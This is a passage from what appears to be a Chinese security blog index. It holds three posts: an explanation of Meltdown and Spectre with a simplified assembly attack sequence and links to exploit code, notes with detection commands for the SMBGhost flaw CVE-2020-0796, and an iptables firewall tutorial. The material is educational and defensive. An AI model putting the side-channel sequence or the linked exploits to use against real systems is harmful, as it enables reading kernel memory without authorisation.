Attacks也详细描述了这一攻击，从文中的声明来看，Lipp等人与GPZ团队似乎是独立发现了这两组漏洞。\nMeltdown漏洞影响几乎所有的Intel CPU和部分ARM CPU，而Spectre则影响所有的Intel CPU和AMD CPU，以及主流的ARM CPU。从个人电脑、服务器、云计算机服务器到移动端的智能手机，都受到这两组硬件漏洞的影响。\n总所周知，软件更换肯定比硬件更换容易，软件某个版本有了bug或漏洞，我们大可换其版本，重装就完事了，或者不用他且罢，但是对于硬件级的漏洞，我们也只能从软件层面修复打补丁，或者也就只能等着修复了漏洞的新版CPU发布了，不过换CPU也是一件麻烦事。\n 参考：\nMeltdown and Spectre\nGithub - IAIK / meltdown\nGithub - paboldin / meltdown-exploit\nGithub - speed47 / spectre-meltdown-checker\nMeltdown.pdf——漏洞发现者的论文\nMeltdown.pdf——论文翻译\n一步一步理解CPU芯片漏洞：Meltdown与Spectre：其中分析的exp是这个Github - paboldin / meltdown-exploit\nMeltdown漏洞利用解读（Part 1）：基础篇\n首发：Meltdown漏洞分析与实践\n理解CPU Spectre漏洞\n解读 Meltdown \u0026 Spectre CPU 漏洞\n给程序员解释Spectre和Meltdown漏洞\n修复：\n史上最大CPU漏洞Meltdown \u0026 Spectre 影响与修复指南\n 0x01 漏洞原理 计算机操作系统有一个最基本的安全目标：保证用户程序不能任意访问内核/其他用户程序的内存。一旦某个恶意应用可以任意访问其他应用程序/操作系统的内存，那么后果则不堪设想。\n为了实现这个目标，操作系统和计算机硬件（CPU）采取了以下措施：\n 操作系统：通过虚拟内存为每个应用程序和内核开辟独立的地址空间，规定相应的访问权限。 CPU：通过硬件实现支持虚拟内存（TLB）及其相应的访问权限。  举例来讲，如果有一个用户程序试图访问一个内核的内存地址，那么在CPU执行相应指令的过程中会探测到没有访问权限，进而触发中断/异常，导致程序终结。\n所以一般情况下，除非恶意程序通过软件漏洞提权获得了内核权限，否则是无论如何也绕不过CPU 的权限检查从而能访问内核地址的。\n具体来看，假设非法访问内存的指令为\n1  mov rax byte[x] // 将内核地址x处的内容存到寄存器rax   操作系统会事先标注好内核的内存地址范围，如果 x 在内核的这个地址范围内，并且 CPU 不是以内核模式运行的话，那么该指令会被 CPU 标注为非法，引起异常，异常处理程序会将 rax 清空为0，并且终结此程序，这样后续指令再来读 rax 的时候就只能读到0了。目前看来这一整套流程还是无懈可击的。\n然而这里一个重要的前提假设是：CPU 在做权限检查并且将 rax 清零的过程中，不会泄露任何关于 [x] 的信息。\n一般的恶意攻击者，采用的是前一种方法进行攻击：提权，让CPU通过权限检查，然而Meltdown却另辟蹊径，在 rax 寄存器清零的过程中，采用了侧信道攻击获取信息\nMeltdown和Spectre这两个漏洞利用了这个过程，他们来源于芯片厂商为了提高CPU性能而引入的两种特性：乱序执行（Out-of-Order Execution）和预测执行(Speculative Execution)。\n乱序执行和预测执行 乱序执行 简单来说，现代CPU执行效率太高，但是内存访问端的速度跟不上，因此现代处理器为了提高性能并不严格按照指令的顺序串行执行，而是对执行进行相关性分析后并行处理乱序执行。比如当处理器中的某些指令需要等待某些资源，处理器不会真的在这里等待而停止指令的执行，而是利用等待资源的时间继续执行后续的指令。在支持乱序执行的CPU中，后面的指令可能在前面指令执行结束前就开始执行了。（两个漏洞的万恶之源）\n但是为了保证程序运行的正确性，处理器会对指令执行安全检查，只有当前用户权限符合指令权限时才能被执行，比如用户空间的指令访问内核内存处理器就会抛出异常。然而安全检查这个操作只有在指令退休（retirement——一条指令退休只有当它的执行的结果真正被提交并对系统可见时才会发生）时才会进行。也就是说，如果在乱序执行中，指令并没有真正执行完成而只是加载到缓存中（下文会提）是不会执行安全检查的。而此时由于乱序执行而被提前执行的指令会被处理器丢弃，但由于乱序执行的指令对缓存的操作在这些指令被丢弃时不会被重置。正是安全检查与乱序执行的空窗期才会让Meltdown有机可乘。\n预测执行 预测执行涉及到程序的控制流，现在处理器不是去解析所有分支指令后然后决定执行哪个操作，而是预测哪个控制流会更有可能被运行再提取相应的指令代码执行。如果预测正确的话，会带来很高的性能提升并提高处理器的并行性。如果预测错误，那些被预测执行的不正确结果会被丢弃，处理器会将状态恢复到预测执行行前的正确状态，再重新跳转到正确执行的分支或指令中运行。与乱序执行类似，预测执行对处理器缓存的操作会被保留。\n攻击 这种机制从宏观上看似乎没什么问题，但由于处理器的缓存（cache）机制，那些被预测执行或乱序执行的指令会被先加载到缓存中，但在处理器恢复状态时并不会恢复处理器缓存的内容。而最新的研究表明攻击者可以利用缓存进行侧信道攻击，而Meltdown与Spectre从本质上来看属于利用处理器的乱序执行或预测执行漏洞进行的缓存侧信道攻击。\n   缓存侧信道攻击   缓存通过数据共享来加快数据访问，也就是说缓存命中与失效对应的响应时间是有差别的，攻击者正是利用这种时间的差异性来推测缓存中的信息，从而获得隐私数据。缓存侧信道攻击主要有Evict+Time[7]、Prime+Probe[6])与Flush+Reload[5]等攻击方式，这里主要简单介绍一下Flush+Reload，也是下文meltdown的exploit中利用的方法。\n假设攻击者和目标程序共享物理内存（也可以是云中不同虚拟机共享内存），攻击者可以反复利用处理器指令将监控的内存块（某些地址）从缓存中驱逐出去，然后在等待目标程序访问共享内存（Flush阶段）。然后攻击者重新加载监控的内存块并测量读取时间(Reload阶段)，如果该内存块被目标程序访问过，其对应的内存会被导入到处理器缓存中，则攻击者对该内存的访问时间将会较短。通过测量加载时间的长短，攻击者可以清楚地知道该内存块是否被目标程序读取过。\nMeltdown与Spectre利用这种侧信道可以进行越权内存访问，甚至读取整个内核的内存数据。\n Meltdown攻击指令序列 以一个简化的meltdown攻击指令序列为例\n; rcx = kernel address ; rbx = probe_array mov rax, byte [rcx] shl rax, 0xc mov rbx, qword [rbx + rax]   rcx为我们非法访问的内核地址，rcx寄存器存放用户空间程序不可访问的内核地址\n  rbx为我们用户空间中的一个数组，rbx寄存器指向探测数组probe_array\n  mov des src，将src的数据移到des里，第三行的是尝试将内核地址中的一个字节移到rax寄存器中，是一个非法操作。该条指令视图访问内核地址，处理器会对其进行作安全检查，检查该进程是否有权限访问该地址。由于我们是以普通用户去执行的，因此这条指令会触发异常，该指令及之后的指令对寄存器的修改都会被丢弃，这样处理器能够回到正常执行的指令中，但由于处理器采用乱序执行的方式，在等待处理器完成该指令的同时（权限检查结束之前），后两条已经执行了，尽管他们都会被丢弃\n  shl des src，将src逻辑左移des位，这里将读到的数据乘以4096（4KB，0xC,正好为x86架构中的一个页的大小4KB）\n  第五行指令将上一条作为索引，对rbx探测数组进行探测，简单来说就是遍历这个数组。理论上讲，执行第四行指令时，rax就应该清零了，但是由于乱序执行，第四行和第五行的指令将会被执行，知道异常处理的时候，将 rbx 和 rax 清零。\n  目前看起来确实没啥问题，因为rbx也会清零，任何关于内核地址的信息都没有留下来。\n但是问题的关键就在第三行指令：如果地址 rbx + rax 不在cache中的话，CPU 会自动将这一地址调入cache中，以便之后访问时获得更好的性能，然而异常处理并不会将这个cache flush掉。而这条 cache 的地址是和 rax 直接相关的，这样就相当于在 CPU 硬件中留下了和 rax 相关的信息。\n那么如何还原 rbx + rax 这个被cache的地址呢？这时候需要用到的原理就是利用cache的访问延时，即已经被cache的数据访问时间短，没有被cache的数据访问时间长。由于rbx这个array是在用户地址空间内的，可以自由操作，首先我们要确保整个 rbx这个数组都是没有被cache的，然后执行上述攻击代码，这时候 rbx + rax 这个地址就已经被cache了，接下来遍历整个rbx 探测数组，来测量访问时间，访问时间最短的那个 page 就可以确定为 rbx + rax。（如下图，图来自原论文meltdown）\n可以看到访问速度最快的，就是已经被cache到的内核地址空间中的一个字节byte，如此循环，即可获得全部内核空间的数据。\ngithub中的PoC就是利用sudo cat /proc/kallsyms | grep “linux_proc_banner”获取linux_proc_banner在内核中的地址，再读取该地址上的值，去获取 /proc/version 的内容，证明漏洞存在\n 至于和meltdown同期的spectre漏洞，和 meltdown 的原理相似，利用分支预测错误的 speculative execution，访问到不该访问的信息，并且同样是通过 cache 这个side channel 传递出去。而且由于利用的分支预测原理普及率非常高，Spectre 的影响面更大一些。\n 具体的Meltdown的exploit分析可以看这篇文章：[Meltdown_Exploit分析](https://www.freebuf.com/articles/system/159811.html#0X02 Exploit 分析)\n我现在只是懂了他为什么这么做，但是我还想懂得他为什么会想到这么做（要去思考1.他做了什么2.他为什么这么做3.他为什么这样想4.忘了哪看到的逻辑层次(绝对不是百度搜出来的那个)\n//TODO\nlibkdump这是作者开源出来的exp库，我们可以通过阅读(//TODO：等我对操作系统有着更深层次的理解时，来分析代码)并编译它，或者直接利用他编译后的库来使用\n0x02 解决办法   Linux上现在提出的解决手段是KPTI（通用技术称为Kaiser），内核和用户态不共享页表，每次你异常、IO、系统调用，都要把内核页表重新装进来。 https://lwn.net/Articles/738975/\n  windows已经推送漏洞更新了，在某个系统补丁里0.0\n1 2 3 4 5  //以管理员权限打开powershell运行命令 //可以看到提示 Set-ExecutionPolicy Bypass Install-Module SpeculationControl Get-SpeculationControlSettings     其余可参见文章：史上最大CPU漏洞Meltdown \u0026 Spectre 影响与修复指南\n0x03 漏洞危害 Meltdown与Spectre本质上都是基于缓存侧信道的攻击。\nMeltdown与Spectre主要用于信息泄露，并不能对目标内存地址进行任意修改。攻击者必须要有执行权限才能进行攻击，对于一般用户只要不被执行恶意代码（比如访问恶意网站），就不会被Meltdown与Spectre攻击。但是在云端，攻击者可以租赁虚拟机来执行攻击者想要执行的任意代码，从而获取宿主物理机以及其它租户的信息，这对云服务商的冲击还是非常大的。\n 文中关于exp的思考问题：\n值得进一步思考的问题    该利用代码一次只能探测一个字节的数据，如果在内核数据还没读取完整之前处理器已经处理异常了该怎么办？ 个人认为：觉得应该可以多次探测，不是每次都能这么快处理异常的\n  探测数组target_array是否可以不用设置成256*4KB，设置成512*2KB，1024*1KB效果会如何？ 个人认为：应该是可以的，但是感觉效率没有256 * 4KB的效率高\n  探测数组target_array是个大数组，占用多个内存页面，是否容易被检测到？ 个人认为：应该是不容易被检测到的，切换页面也需要时间，占多个页面导致效率大大降低\n    ","description":"Something about Meltdown","tags":["CVE","hardware"],"title":"Meltdown And Hardware Security","uri":"/posts/meltdown-and-hardware-security/"},{"categories":["windows"],"content":" details about new SMB wormable bug leak:\nADV200005 | Microsoft Guidance for Disabling SMBv3 Compression\nMicrosoft patches SMBv3 wormable bug that leaked earlier this week\nCVE-2020-0796相关信息（smbv3漏洞检测工具）：\nnikallass / check-smb-v3.11.sh ：linux下的检测脚本\nScanner for CVE-2020-0796 - SMBv3 RCE ： 基于python3的检测脚本\nvimeo 视频演示\nCVE-2020-0796相关分析信息：\nSMBGhost – Analysis of CVE-2020-0796\n微软SMBv3客户端/服务端远程代码执行漏洞（CVE-2020-0796）技术分析\nCVE-2020-0796-PoC：\nPoC for triggering buffer overflow via CVE-2020-0796\nCVE-2020-0796 - Windows SMBv3 LPE exploit #SMBGhost\n 概述 PoC报告可以看这个文档 ，虽然Windows defender没有直接删除，但是当内容保存时，提示我需要发到远端服务器判断，看来windows defender还是挺靠谱的\n3.12爆出的漏洞，3.18公布exp\n windows SMB 3使用说明：\nhttps://docs.microsoft.com/zh-cn/windows-server/storage/file-server/file-server-smb-overview\n 受影响的系统  + Windows 10 Version 1903 for 32-bit Systems + Windows 10 Version 1903 for ARM64-based Systems + Windows 10 Version 1903 for x64-based Systems + Windows 10 Version 1909 for 32-bit Systems + Windows 10 Version 1909 for ARM64-based Systems + Windows 10 Version 1909 for x64-based Systems + Windows Server, version 1903 (Server Core installation) + Windows Server, version 1909 (Server Core installation) POC  检查本地计算机上的活动SMB连接版本（Windows 8及更高版本）  Powershell.exe-\u003e Get-SMBConnection 这仅显示当前打开的SMB连接   Nmap扫描以检查支持的SMB协议版本 nmap -p445 --script smb-protocols \u003c目标主机/子网\u003e | grep -P'\\ d + \\。\\ d + \\。\\ d + \\。\\ d + | ^ \\ |。\\ s + 3.11'  漏洞分析 ","description":"","tags":["CVE","Windows","security"],"title":"CVE-2020-0796","uri":"/posts/cve-2020-0796/"},{"categories":["linux","Network"],"content":"iptables  参考：\niptables - Linux man page\niptables_command\niptables详解\niptables详解\niptables详解及一些常用规则\n 简介 netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。\niptables分为2部分，一部分位于内核中，用来存放规则，称为NetFilter。还有一段在用户空间中，用来定义规则，并将规则传递到内核中，这段在用户空间中的程序就叫做iptables。 所以对于用户空间来说，就是按照需要生成一条条规则，然后向内核中提交，存放到NetFilter，让这些规则在数据传输与处理的过程中起作用。形象化地理解来说就是，把iptables看作是一个客户端代理，用户通过iptables这个代理，与内核中的安全框架netfilter进行交互。netfilter才是防火墙真正的安全框架，处于内核空间内。\nNetfilter是linux操作系统核心层内部的一个数据包处理模块，拥有如下功能：\n 网络地址转换(Network Address Translate) 数据包内容修改 数据包过滤的防火墙功能  链 iptables开启后，数据报文从进入服务器到出来经过5条链，分别为 prerouting 、 input 、output 、 forward 、 postrouting\n如下图，即数据报文的可能经过的路径\n每条链上设有多种规则，数据报文必须按照顺序一个个匹配这些规则\n正如图中，数据报文经过的5条链上，必须逐一经过每一条链，而在链上，数据报文必须逐一通过(符合)每一个规则的限制，方能到下一条链上\n INPUT链：当接收到防火墙本机地址的数据包(入站)时，应用此链的规则 OUTPUT链：当防火墙本机向外发送数据包(出站)时，应用此链的规则 FORWARD链：当接收到需要通过防火墙发送给其他地址的数据包(转发)时，应用此链的规则 PREROUTING链：在对数据包作路由选择之前，应用此链的规则，如DNAT POSTROUTING链：在对数据包作路由选择之后，应用此链的规则，如SNAT  在链的第一张图中，我们可以形象地看出数据包在哪些条件下需要经过哪些链\ninput和output链更多应用在主机防火墙中，主要针对本机进出的数据安全控制，而prerouting、postrouting、forward链更多应用在网络防火墙中，特别是防火墙服务器作为网关时使用的情况\n表的概念 虽然一条链上有多条规则，但是基于某些规则的作用功能很相似，因此有多个相似功能的规则组成了表，iptables为我们提供了四种表\n filter表：主要用于对数据包进行过滤，根据具体的规则决定是否放行该数据包(如DROP、ACCEPT 、REJECT 、 LOG  )，所谓防火墙其实基本上是指这张表上的过滤规则，对应内核模块的iptables_filter nat表：Network Address Translation，网络地址转换功能，主要用于修改数据包的ip地址、端口号信息等 ( 如 SNAT 、 DNAT 、 MASQUERADE 、REDIRECT )。属于一个流的包只会经过这个表一次，如果第一个包被允许做NAT或Masqueraded，那么余下的包都会自动做相同的操作，对应内核模块的iptables_nat mangle表：拆解报文，做出修改，并重新封装，主要用于修改数据包的TOS(Type of Service，服务类型)、TTL( Time To Live，生存周期)以及为数据包设置Mark标记，以实现QoS(Quality Of Service ，服务质量)调整以及策略路由等应用，由于需要相应的路由设备支持，因此应用并不广泛，对应内核模块iptables_mangle raw表：从iptables 1.2.9版本后新添加的表，主要用于决定数据包是否被状态跟踪机制处理，在匹配数据包时，raw表规则要有优先于其他表，对应内核模块iptables_raw  我们自定义的所有规则，都会添加到四张表中的其中一张表中\n规则表之间的优先顺序：Raw \u003e\u003e mangle \u003e\u003e nat \u003e\u003e filter\n表链关系 5条链中，并不是每条链都能应用所有类型的表，事实上除了Output链上能同时拥有四种表以外，其他都只能有两到三种表\n上图即为每种链能应用的表，实际上，在各表中还有匹配顺序，每条链上的各个表的匹配顺序为： raw → mangle → nat → filter\n把上图转换成表，可直观地看出来，表链的关系\n    raw mangle nat filter     prerouting 1 1 1 0   input 0 1 1 1   forward 0 1 0 1   output 1 1 1 1   postrouting 0 1 0 1    数据包通过防火墙流程可以总结如下：\n规则的概念 iptables规则主要包含了“条件\u0026动作”，即匹配出符合什么条件(规则)后，对它采取怎样的动作\n匹配条件  S_IP：source ip，即源ip S_PORT：source port，源端口 D_IP：destination ip，目标ip D_PORT：destination port，目标端口 TCP/UDP：第四层协议(传输层)  处理的动作  ACCEPT：允许数据包通过 DROP：直接丢弃数据包，不回应任何信息，客户端只有当该链超时后才会有反应 REJECT：拒绝数据包，会给客户端发送一个数据包被丢弃的相应信息 SNAT：S指Source，源NAT（源地址转换），再进入路由层面的route之后，出本地的网络线之前，改写源地址，目标地址不变，并在本机建立NAT表项，当数据返回时，根据NAT表将目的地址数据改写为数据发送出去的源地址，并发给主机，解决私网用户用同一个公网ip上网的问题 MASQUERADE：是SNAT的一种特殊形式，适用于动态的、临时会变的IP上； DNAT：D指Destination，目的NAT，解决私网服务端，接收公网请求的问题。和SNAT相反，IP包经过route之前，重新修改目标地址，源地址不变，在本机建立NAT表项，当数据返回时，根据NAT表将源地址修改为数据发送过来时的目标地址，并发给远程主机。可以隐藏后端服务器的真实地址 REDIRECT：在本机做端口映射； LOG：在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则  除去最后一个LOG，前三条规则匹配数据包后，该数据包就不会再往下继续匹配了，所以编写规则的顺序极其关键\n 关于DNAT和SNAT：\nhttps://blog.51cto.com/sxj007/110924\n简单来说，SNAT是替换接收到的数据包的源地址，一般用在postrouting\n而DNAT是替换数据包中的目的地址，一般用在prerouting\n 命令 有关 iptables 的命令可以用下图来解释\n1  $ iptables [-t table_name] command [chain_name] [parameter] [-j target\u0026action]   parameter 是用于条件匹配\n  所有表名必须小写 filter / nat / mangle / raw\n  所有链名必须大写 INPUT / OUTPUT / FORWARD / PREROUTING / POSTROUTING\n  所有匹配必须小写 -s / -d / -m \u003cmodule_name\u003e / -p\n  所有动作必须大写 ACCEPT / DROP / SNAT / DNAT / MASQUERADE\n  对于parameter条件匹配，如下图所示：\n对于Command选项： -A 在指定链末尾添加(append)一条新规则\n-D 删除（delete）指定链中的某一条规则，可以按规则序号和内容删除\n-I 在指定链中插入（insert）一条新的规则，默认在第一行添加\n-R 修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换\n-L 列出（list）指定链中所有的规则进行查看\n-E 重命名用户定义的链，不改变链本身\n-F 清空（flush）\n-N 新建（new-chain）一条用户自己定义的规则链\n-X 删除指定表中用户自定义的规则链（delete-chain）\n-P 设置指定链的默认策略（policy）\n-Z 将所有表的所有链的字节和数据包计数器清零\n-n 使用数字形式（numeric）显示输出结果\n-v 查看规则表详细信息（verbose）的信息\n-V 查看版本(version)\n-h 获取帮助（help）\n 打开linux转发功能：echo 1 \u003e /proc/sys/net/ipv4/ip_forward\n 删除input链的第一条规则：iptables -D INPUT 1\niptables防火墙常用的策略 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85  # 1.拒绝进入防火墙的所有ICMP协议数据包 $ iptables -I INPUT -p icmp -j REJECT # 2.允许防火墙转发除ICMP协议以外的所有数据包 # 说明：使用“！”可以将条件取反。 $ iptables -A FORWARD -p ! icmp -j ACCEPT # 3.拒绝转发来自192.168.1.10主机的数据，允许转发来自192.168.0.0/24网段的数据 # 说明：注意要把拒绝的放在前面,不然拒绝语句就没有用了就不起作用了啊。 $ iptables -A FORWARD -s 192.168.1.11 -j REJECT $ iptables -A FORWARD -s 192.168.0.0/24 -j ACCEPT # 4.丢弃从外网接口（eth1）进入防火墙本机的源地址为私网地址的数据包 $ iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP $ iptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROP $ iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP # 5.封堵网段（192.168.1.0/24），两小时后解封。 # 说明：这个策略咱们借助crond计划任务来完成，就再好不过了。 $ iptables -I INPUT -s 10.20.30.0/24 -j DROP $ iptables -I FORWARD -s 10.20.30.0/24 -j DROP $ at now 2 hours at\u003e iptables -D INPUT 1 at\u003e iptables -D FORWARD 1 [1] Stopped at now 2 hours # 6.只允许管理员从202.13.0.0/16网段使用SSH远程登录防火墙主机。 # 说明：这个用法比较适合对设备进行远程管理时使用 # 比如位于分公司中的SQL服务器需要被总公司的管理员管理时。 $ iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPT $ iptables -A INPUT -p tcp --dport 22 -j DROP # 7.允许本机开放从TCP端口20-1024提供的应用服务。 $ iptables -A INPUT -p tcp --dport 20:1024 -j ACCEPT $ iptables -A OUTPUT -p tcp --sport 20:1024 -j ACCEPT # 8.允许转发来自192.168.0.0/24局域网段的DNS解析请求数据包。 $ iptables -A FORWARD -s 192.168.0.0/24 -p udp --dport 53 -j ACCEPT $ iptables -A FORWARD -d 192.168.0.0/24 -p udp --sport 53 -j ACCEPT # 9.禁止其他主机ping防火墙主机，但是允许从防火墙上ping其他主机 $ iptables -I INPUT -p icmp --icmp-type Echo-Request -j DROP $ iptables -I INPUT -p icmp --icmp-type Echo-Reply -j ACCEPT $ iptables -I INPUT -p icmp --icmp-type destination-Unreachable -j ACCEPT # 10.禁止转发来自MAC地址为00：0C：29：27：55：3F的和主机的数据包 # 说明：iptables中使用“-m 模块关键字”的形式调用显示匹配。这里用“-m mac –mac-source”来表示数据包的源MAC地址。 $ iptables -A FORWARD -m mac --mac-source 00:0c:29:27:55:3F -j DROP # 11.允许防火墙本机对外开放TCP端口20、21、25、110以及被动模式FTP端口1250-1280 # 说明：这里用“-m multiport –dport”来指定目的端口及范围 $ iptables -A INPUT -p tcp -m multiport --dport 20,21,25,110,1250:1280 -j ACCEPT # 12.禁止转发源IP地址为192.168.1.20-192.168.1.99的TCP数据包。 # 说明：此处用“-m –iprange –src-range”指定IP范围。 $ iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.20-192.168.1.99 -j DROP # 13.禁止转发与正常TCP连接无关的非—syn请求数据包。 # 说明：“-m state”表示数据包的连接状态，“NEW”表示与任何连接无关的，新的嘛！ $ iptables -A FORWARD -m state --state NEW -p tcp ! --syn -j DROP # 14.拒绝访问防火墙的新数据包，但允许响应连接或与已有连接相关的数据包 # 说明：“ESTABLISHED”表示已经响应请求或者已经建立连接的数据包 # “RELATED”表示与已建立的连接有相关性的，比如FTP数据连接等。 $ iptables -A INPUT -p tcp -m state --state NEW -j DROP $ iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT # 15.只开放本机的web服务（80）、FTP(20、21、20450-20480)，放行外部主机发住服务器其它端口的应答数据包，将其他入站数据包均予以丢弃处理。 $ iptables -I INPUT -p tcp -m multiport --dport 20,21,80 -j ACCEPT $ iptables -I INPUT -p tcp --dport 20450:20480 -j ACCEPT $ iptables -I INPUT -p tcp -m state --state ESTABLISHED -j ACCEPT $ iptables -P INPUT DROP   常用iptables规则 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137  # 1. 删除所有现有规则 $ iptables -F # 2. 设置默认的 chain 策略 $ iptables -P INPUT DROP $ iptables -P FORWARD DROP $ iptables -P OUTPUT DROP # 3. 阻止某个特定的 IP 地址 $ BLOCK_THIS_IP=\"x.x.x.x\" $ iptables -A INPUT -s \"$BLOCK_THIS_IP\" -j DROP # 4. 允许全部进来的（incoming）SSH $ iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT # 5. 只允许某个特定网络进来的 SSH $ iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT # 6. 允许进来的（incoming）HTTP $ iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT # 7. 多端口（允许进来的 SSH、HTTP 和 HTTPS） $ iptables -A INPUT -i eth0 -p tcp -m multiport --dports 22,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp -m multiport --sports 22,80,443 -m state --state ESTABLISHED -j ACCEPT # 8. 允许出去的（outgoing）SSH $ iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT # 9. 允许外出的（outgoing）SSH，但仅访问某个特定的网络 $ iptables -A OUTPUT -o eth0 -p tcp -d 192.168.101.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT # 10. 允许外出的（outgoing） HTTPS $ iptables -A OUTPUT -o eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A INPUT -i eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT # 11. 对进来的 HTTPS 流量做负载均衡 $ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.101:443 $ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.102:443 $ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.103:443 # 12. 从内部向外部 Ping $ iptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT $ iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT # 13. 从外部向内部 Ping $ iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT $ iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT # 14. 允许环回（loopback）访问 $ iptables -A INPUT -i lo -j ACCEPT $ iptables -A OUTPUT -o lo -j ACCEPT # 15. 允许 packets 从内网访问外网 # if eth1 is connected to external network (internet) # if eth0 is connected to internal network (192.168.1.x) $ iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT # 16. 允许外出的 DNS $ iptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT $ iptables -A INPUT -p udp -i eth0 --sport 53 -j ACCEPT # 17. 允许 NIS 连接 $ rpcinfo -p | grep ypbind ; This port is 853 and 850 $ iptables -A INPUT -p tcp --dport 111 -j ACCEPT $ iptables -A INPUT -p udp --dport 111 -j ACCEPT $ iptables -A INPUT -p tcp --dport 853 -j ACCEPT $ iptables -A INPUT -p udp --dport 853 -j ACCEPT $ iptables -A INPUT -p tcp --dport 850 -j ACCEPT $ iptables -A INPUT -p udp --dport 850 -j ACCEPT # 18. 允许某个特定网络 rsync 进入本机 $ iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT # 19. 仅允许来自某个特定网络的 MySQL 的链接 $ iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 3306 -m state --state ESTABLISHED -j ACCEPT # 20. 允许 Sendmail 或 Postfix $ iptables -A INPUT -i eth0 -p tcp --dport 25 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 25 -m state --state ESTABLISHED -j ACCEPT # 21. 允许 IMAP 和 IMAPS $ iptables -A INPUT -i eth0 -p tcp --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 143 -m state --state ESTABLISHED -j ACCEPT $ iptables -A INPUT -i eth0 -p tcp --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT # 22. 允许 POP3 和 POP3S $ iptables -A INPUT -i eth0 -p tcp --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 110 -m state --state ESTABLISHED -j ACCEPT $ iptables -A INPUT -i eth0 -p tcp --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 995 -m state --state ESTABLISHED -j ACCEPT # 23. 防止 DoS 攻击 $ iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT # 24. 设置 422 端口转发到 22 端口 $ iptables -t nat -A PREROUTING -p tcp -d 192.168.102.37 --dport 422 -j DNAT --to 192.168.102.37:22 $ iptables -A INPUT -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT $ iptables -A OUTPUT -o eth0 -p tcp --sport 422 -m state --state ESTABLISHED -j ACCEPT # 25. 为丢弃的包做日志（Log） $ iptables -N LOGGING $ iptables -A INPUT -j LOGGING $ iptables -A LOGGING -m limit --limit 2/min -j LOG --log-prefix \"IPTables Packet Dropped: \" --log-level 7 $ iptables -A LOGGING -j DROP   iptables防火墙规则的保存与恢复 